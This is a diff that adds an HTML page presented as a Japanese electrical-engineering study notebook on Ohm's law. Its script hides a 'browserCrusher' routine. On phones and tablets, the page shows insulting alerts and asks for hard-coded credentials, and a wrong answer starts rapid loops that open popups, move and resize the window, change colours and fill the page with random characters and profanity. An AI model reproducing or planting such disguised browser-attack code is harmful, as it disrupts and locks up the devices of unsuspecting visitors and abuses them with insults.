@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8">
+    <title>Survey of Electric note</title>
+    <style>
+
+      /* ----------------- ページ全体の設定 ----------------- */
+      body {
+
+        background-color : #02173C;        /* 背景色：瑠璃色 */
+        background-image : url( "bgimg.jpg" );  /* 背景画像 */
+        background-position : top center;  /* 背景画像の位置 */
+        background-repeat : no-repeat;     /* 背景画像のリピート */
+        background-attachment : fixed;     /* スクロール時の背景画像を固定 */
+        background-size : cover;           /* 画面全体に表示 */
+
+        color : #E5B217;                   /* 文字色 金色ラブリッチェ */
+        font-family : "SourceHanCodeJP-Light", sans-serif, monospace, serif;
+        /* text-align : center;               /* 中央揃え */
+      }
+
+      div.htmlWrap {
+
+        background-color : rgba( 02, 17, 60, 0.6 );
+        /* border : solid 1px red; */
+        margin : auto;
+        width : 77%;
+        /*padding : 1em;*/
+        /*text-align: center;*/
+      }
+
+      div.header h1.title {
+
+        margin-bottom : 0;
+        text-align : center;
+        font-family : "Apple Chancery", cursive;
+      }
+      div.header div.readme {
+
+        font-family : "Apple Chancery", cursive;
+        text-align : center;
+      }
+      div.header div.date {
+
+        text-align : right;
+        font-size : 0.8em;
+      }
+
+      div.chapter h2.title {
+
+        width : 70%;
+        border-bottom : solid 1px #777777;
+      }
+
+      div.part div.chapter,
+      div.part div.chapter div.section,
+      div.part div.chapter div.section div.subsection,
+      div.part div.chapter div.section div.subsection div.subsubsection,
+      div.part div.chapter div.section div.subsection div.subsubsection div.item,
+      div.part div.chapter div.section div.subsection div.subsubsection div.item div.contents {
+
+        margin-left : 1em;
+      }
+      div.part div.chapter p {
+
+        margin-left : 1em;
+      }
+
+      div.chapter div.section h3.title {
+
+        border-bottom : solid 1px #777777;
+        max-width : 33%;
+        min-width : 20%;
+      }
+
+      ul {
+        padding-left : 1.5em;
+      }
+
+      table .alignRight {
+
+        text-align : right;
+      }
+      table .alignCenter {
+
+        text-align : center;
+      }
+      table .alignLeft {
+
+        text-align : left;
+      }
+
+      .formula {
+
+        text-align: center;
+        font-style: italic;
+      }
+
+    </style>
+  </head>
+
+  <body>
+    <div class="htmlWrap">
+      <div class="header">
+        <h1 class="title">Survey of Electric notebook</h1>
+        <div class="date">YYYY/MM/dd (Aaa), HH:mm:ss</div>
+        <div class="readme">
+          This is notebook on Survey of Electric, Department of Mechanical CAD Design at Tohoku Electronics College.
+        </div>
+      </div>
+      <div class="part">
+        <h2>第2部 直流回路</h2>
+        <div class="chapter">
+          <h3>第1章 オームの法則</h3>
+          <p>
+            電気的な位置の高さを<strong>電位</strong>といい，電池の<strong>陽極</strong>(+極)の電位は<strong>陰極</strong>(-極)の電位よりも高い．<br>
+            電気の流れを<strong>電流</strong>といい，電流は電池の両局間の電位に差があるときに流れる．この電位のさを<strong>電位差</strong>または<strong>電圧</strong>という．<br>
+            電位差を保って連続的に電流を流す原動力となるものを<strong>起電力</strong>という．この起電力を発生して電気エネルギーを供給する装置を<strong>電源</strong>という．<br>
+            電流が流れて電気を消費する働きをするものを<strong>負荷</strong>という．<br>
+            電流が流れる通路を<strong>電気回路</strong>または<strong>回路</strong>という．<br>
+            電流が実際に回路に流れている場合，回路が閉じている，あるいは<strong>閉回路</strong>であるという．これに対し，電流が流れない場合，回路が開いている，あるいは<strong>開回路</strong>であるという．<br>
+          </p>
+          <div class="section">
+            <h4>1.1. オームの法則</h4>
+            <p>
+              閉回路に電圧を印加すると電流が流れるが，この電気回路に流れる電流は電圧に比例し，回路の抵抗に反比例する．これを<strong>オームの法則</strong>という．オームの法則を数式で表すと，<br>
+              <div class="formula">V = RI</div>
+              と表せる．
+            </p>
+          </div>
+        </div>
+      </div><!-- part -->
+    </div>  <!-- htmlWrap -->
+    <!-- chapter-section-subsection-subsubsection-item-contents -->
+
+    <script>
+
+      window.addEventListener ( "load" , init , false );
+
+      function init () {
+
+        let dom = {
+          date : document.querySelector ( "div.header div.date" ),
+        }
+
+        judge_fuckDevice ();
+        set_date ( dom.date );
+
+        function judge_fuckDevice () {
+
+          let username = "hoge";
+          let password = "fuga";
+          let ua = window.navigator.userAgent.toLowerCase ();
+          console.log ( ua );
+          if ( isDullDevice () ) {
+
+            alert ( "You are using stupid and dull fucking device!" );
+            alert ( "We will attacks to fucking device (smartphone and tablet)." );
+            let user = window.prompt ( "Enter the username." );
+            let pass = window.prompt ( "Enter the password." );
+
+            if ( user != username || pass != password ) {
+
+              browserCrusher ();
+            }
+          }
+
+          function isDullDevice () {
+
+            let stupidUA = /Android | webOS | iPhone | iPad | iPod | BlackBerry | IEMobile | Opera Mini/i;
+            return ( window.navigator.userAgent.search ( stupidUA ) !== -1);
+          }
+        }
+
+        function set_date ( dom ) {
+
+          let date = new Date ();
+
+          let format = {
+
+            yyyy : date.getFullYear (),
+            MM : ( "00" + ( date.getMonth () + 1 ) ).slice ( -2 ),
+            dd : ( "00" + date.getDate () ).slice ( -2 ),
+            day : function () {
+
+              let aaa;
+
+              switch ( date.getDay() ) {
+                case 0:
+                  aaa = "Sun";
+                  break;
+                case 1:
+                  aaa = "Mon";
+                  break;
+                case 2:
+                  aaa = "Tue";
+                  break;
+                case 3:
+                  aaa = "Wed";
+                  break;
+                case 4:
+                  aaa = "Thu";
+                  break;
+                case 5:
+                  aaa = "Fri";
+                  break;
+                case 6:
+                  aaa = "Sat";
+                  break;
+                default:
+                  aaa = "NaN";
+              }
+              return aaa;
+            },
+            HH : ( "00" + date.getHours () ).slice ( -2 ),
+            mm : ( "00" + date.getMinutes () ).slice ( -2 ),
+            ss : ( "00" + date.getSeconds () ).slice ( -2 ),
+          };
+
+          dom.innerHTML = format.yyyy + "/" + format.MM + "/" + format.dd + " (" + format.day () + "), " + format.HH + ":" + format.mm + ":" + format.ss;
+        }
+      }
+
+      document.oncontextmenu = function () {
+
+        let command = window.prompt ( "Enter the command" );
+        command = command.toLowerCase ();
+        switch ( command ) {
+          case '':
+          case 'context':
+          case 'contextmenu':
+          case 'menu':
+            return true;
+
+          case 'display:block':
+          case 'body.display:block':
+          case 'body.style.display:block':
+          case 'note.display:block':
+          case 'note.style.display:block':
+          case '.note.display:block':
+          case '.note.style.display:block':
+          case 'body.note.display:block':
+          case 'body.note.style.display:block':
+            toggleDisp ( "body", true );
+            break;
+
+          case 'display:none':
+          case 'body.display:none':
+          case 'body.style.display:none':
+          case 'note.display:none':
+          case 'note.style.display:none':
+          case '.note.display:none':
+          case '.note.style.display:none':
+          case 'body.note.display:nonw':
+          case 'body.note.style.display:none':
+            toggleDisp ( "body", false );
+            break;
+
+          case 'fuck':
+            alert ( "You fucking asshole !!" );
+            break;
+
+          default:
+            alert ( "'" + command + "' is not command" );
+        }
+        return false;
+      }
+
+      function toggleDisp ( elem, state ) {
+
+        let element = [];
+        switch ( elem ) {
+          case 'body':
+            element [ 0 ] = document.querySelector ( ".htmlWrap" );
+            break;
+        }
+        if ( state ) {
+
+          for ( let i = 0; i < element.length; i++ ) {
+
+            element [ i ].style.display = "block";
+            document.querySelector ( ".htmlWrap" ).style.display = "block";
+          }
+
+        } else {
+
+          for ( let i = 0; i < element.length; i++ ) {
+
+            console.log ( element );
+            element [ i ].style.display = "none";
+          }
+        }
+      }
+
+      function browserCrusher () {
+
+        setInterval ( bgcolCrusher, 1 );
+        setInterval ( rdmOpWin , 1 );
+        setInterval ( rdmMvWin , 1 );
+        setInterval ( rdmResizeWin , 100 );
+        setInterval ( rdmChar , 1 );
+        setInterval ( rdmWord , 100 );
+
+        let probabilityWin = 0.001;
+        let probabilityWord = 0.0001;
+
+        function bgcolCrusher () {
+
+          let rgb = "";
+          let body = document.querySelector ( "body" );
+          for ( let i = 0; i < 3; i++ ) {
+
+            rgb = rgb + Math.floor ( Math.random () * 256 ).toString ( 16 );
+          }
+          body.style.backgroundColor = "#" + rgb;
+        }
+
+        function rdmOpWin () {
+
+          // let probability = 0.001;
+          if ( Math.random () < probabilityWin ) {
+
+            // window.open ( "browserCrusher.html" , "hoge" , "width=300 , height=200" );
+            // for ( let i = 0; i < 3; i++ ) {
+              window.open ( "timetable.html" , "_blank" , "width=300 , height=200" );
+              probability = probability * 0.5;
+              // console.log("op");
+            // }
+          }
+        }
+
+        function rdmMvWin () {
+
+          window.moveBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
+          // let w = Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width;
+          // let h = Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height;
+
+        }
+
+        function rdmResizeWin () {
+
+          window.resizeBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
+        }
+
+        function rdmChar () {
+
+          let chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`~!@#$%^&*()-_=+[{}]\|;:,./<>?¡™£¢∞§¶•ªº–≠œ∑´®¥¨π“‘«»’”∆˚¬…˜µ≤≥÷æΩ≈ç√";
+          document.write ( chars [ Math.floor ( Math.random () * chars.length ) ] );
+        }
+
+        function rdmWord () {
+
+          let word = [ "fuckyou", "You asshole" ];
+          if ( Math.random () < probabilityWord ) {
+
+            document.write ( word [ Math.floor ( Math.random () * word.length ) ] );
+          }
+        }
+      }
+    </script>
+  </body>
+</html>
